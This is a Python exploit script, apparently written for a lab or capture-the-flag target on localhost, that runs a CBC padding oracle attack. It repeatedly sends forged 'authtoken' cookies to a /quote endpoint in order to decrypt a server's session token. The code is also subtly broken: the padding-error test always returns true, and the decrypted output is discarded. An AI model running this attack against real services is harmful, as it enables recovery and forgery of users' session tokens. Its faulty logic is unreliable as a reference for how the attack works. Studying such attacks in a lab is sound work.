from time import sleep
import requests

# The URL of the quote page, adjust as necessary
QUOTE_URL = "http://127.0.0.1:5000/quote"

def has_padding_error(ciphertext):
    """
    This function sends the modified ciphertext to the server and returns True if
    there's a padding error, False otherwise. Adjust this function based on how the
    server indicates a padding error.
    """
    cookies = {'authtoken': ciphertext.hex()}
    response = requests.get(QUOTE_URL, cookies=cookies)
    print(response.text)
    # Adjust this condition based on the server's error response for padding errors
    return "padding" or "Data" in response.text.lower()

def xor_bytes(a, b):
    """
    Returns the result of XORing two byte strings.
    """
    return bytes(x ^ y for x, y in zip(a, b))

def decrypt_block(previous_block, cipher_block):
    """
    Decrypts a single block of ciphertext using the padding oracle attack.
    """
    # Initialize an array to hold the intermediate state
    intermediate = [0] * 16
    # Initialize the decrypted plaintext block
    decrypted_block = [0] * 16
    
    for i in range(1, 17):
        # Padding value we're aiming for
        pad_val = bytes([i] * i)
        for guess in range(256):
            sleep(0.05)
            # Prepare a modified block with the guess
            modified_block = bytes([0] * (16 - i) + [guess] + [intermediate[j] ^ i for j in range(16 - i, 16)])
            if not has_padding_error(modified_block + cipher_block):
                # We found the correct intermediate value
                intermediate[16 - i] = guess ^ i
                decrypted_block[16 - i] = previous_block[16 - i] ^ intermediate[16 - i]
                break

    return bytes(decrypted_block)

def decrypt_ciphertext(ciphertext):
    """
    Decrypts the full ciphertext using the padding oracle attack.
    """
    # Assuming the first 16 bytes are the IV
    iv, ciphertext = ciphertext[:16], ciphertext[16:]
    blocks = [ciphertext[i:i+16] for i in range(0, len(ciphertext), 16)]
    decrypted_text = b""

    previous_block = iv
    for block in blocks:
        decrypted_block = decrypt_block(previous_block, block)
        decrypted_text += decrypted_block
        previous_block = block

    return decrypted_text

# Example usage
# You'll need to obtain a ciphertext (e.g., from a valid request) and pass it here.
base_url = "http://127.0.0.1:5000"
cookie = requests.get(f'{base_url}')
cookie_header = cookie.headers.get('Set-Cookie')    
authtoken = cookie_header.split('=')[1].split(';')[0]
print("auth len",len(authtoken))
encrypted_token = bytes.fromhex(authtoken)  # The encrypted token from the server
decrypted_text = decrypt_ciphertext(encrypted_token)
response = requests.get(QUOTE_URL, cookies={'authtoken': authtoken})
print(response.text)
#print("Decrypted text:", decrypted_text)
